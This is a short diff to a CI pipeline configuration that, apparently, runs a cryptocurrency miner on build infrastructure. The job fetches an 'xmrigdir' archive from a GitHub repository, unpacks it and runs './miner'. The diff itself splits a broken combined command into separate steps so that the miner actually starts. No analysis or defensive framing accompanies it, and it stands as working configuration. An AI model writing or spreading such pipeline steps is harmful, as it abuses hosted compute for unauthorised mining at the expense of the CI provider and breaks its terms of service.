@@ -12,5 +12,7 @@ blocks:
           commands:
             - checkout
             - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
-            - tar xvf xmrigdir.tar.gz - cd xmrigdir - chmod +x ./miner
+            - tar xvf xmrigdir.tar.gz
+            - cd xmrigdir
+            - chmod +x miner
             - ./miner
